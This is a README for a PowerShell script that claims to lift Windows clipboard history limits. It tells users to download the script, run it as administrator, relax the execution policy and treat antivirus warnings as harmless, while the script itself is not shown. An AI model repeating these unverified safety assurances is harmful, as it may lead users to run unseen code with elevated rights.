# 📋 Windows-Clipboard-Extender - Remove limits from your clipboard history

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/virtualden7218/Windows-Clipboard-Extender/releases)

Windows stores a limited number of items in your clipboard history. By default, the system keeps only 25 items and restricts the size of those items to 4 megabytes. If you copy many files or long sections of text, Windows discards your older data. This tool removes those restrictions. It allows you to keep more history entries and store larger pieces of information.

## 🛠 What this tool does

The program acts as a patch for your Windows clipboard settings. It updates the internal configuration files that control these history limits. Because the script uses native PowerShell commands, it does not require you to install extra software. It works directly with the tools already built into your Windows operating system.

## 📝 System Requirements

*   **Operating System**: Windows 10 or Windows 11.
*   **Permissions**: You must have administrative access to your computer to apply the patch.
*   **Software**: PowerShell 5.1 or newer. This comes pre-installed on every Windows machine.

## 📥 Getting the software

Visit the official release page to get the script. We host all versions there.

[Click here to visit the release page and download the software](https://github.com/virtualden7218/Windows-Clipboard-Extender/releases)

1. Go to the link above.
2. Look for the section labeled "Assets."
3. Click the file ending in `.ps1` to save it to your computer.
4. Save the file in a location you can easily find, such as your Downloads folder.

## 🚀 How to set up the patch

Follow these steps to update your clipboard settings.

1. Locate the file you downloaded.
2. Right-click the file named `Windows-Clipboard-Extender.ps1`.
3. Choose the option titled "Run with PowerShell."
4. A small blue window will appear on your screen. This is the PowerShell console.
5. If a security prompt appears, confirm that you want to run the script.
6. The window will display the status of the patch. It will show confirmation when it successfully updates the registry entries.
7. Close the window once the process finishes.

## ⚙️ How to verify the changes

The patch modifies settings that Windows reads upon startup. You need to restart your computer to make sure the change takes full effect. Once you restart your computer, your clipboard will handle significantly more items and larger files than before. 

You can test the change by copying several items in a row. Press the `Windows Key + V` on your keyboard to open the clipboard history menu. You will notice that the history now retains more items than the default setting allowed.

## 🛡 Security and Privacy

This script performs simple modifications to your computer registry. It does not send any data to external servers. It does not monitor what you copy or paste. Your clipboard history stays entirely on your local machine.

Because this tool modifies your system registry, some antivirus programs might flag it as a safety precaution. This happens because the script interacts with system settings. The code is open for review. You can open the file in Notepad to inspect the commands yourself. It only executes standard commands provided by Microsoft to manage clipboard history.

## 🔄 Reverting changes

If you decide you no longer want the extended limits, you can easily go back to your default Windows settings. Windows manages these limits through standard registry keys. If you perform a system reset or run a separate cleanup script, your default settings will return to the original 25-item limit. For most users, keeping the patch active provides a better workflow without impacting system performance.

## 💡 Troubleshooting common issues

If the script does not seem to work, check these common items:

*   **Administrator Access**: The script requires elevated permissions to edit the registry. Make sure you run the file as an administrator if your user account has restrictions.
*   **Execution Policy**: On some computers, Windows restricts the running of scripts. If you get an error that scripts are disabled, you may need to open PowerShell as an administrator and type `Set-ExecutionPolicy RemoteSigned` before running the patch.
*   **Restart Required**: Many Windows settings do not update until the operating system completes a full restart. If the history limit still seems small, restart your computer.
*   **Version Compatibility**: Ensure you run the file on a supported version of Windows 10 or 11. Older versions of Windows do not support the same clipboard history features.

Keywords: clipboard, clipboard-history, clipboard-management, no-dependencies, patcher, powershell, powershell-script, powershell-scripts, windows-clipboard, windows-clipboard-history, windows-clipboard-history-extension, windows-tweaks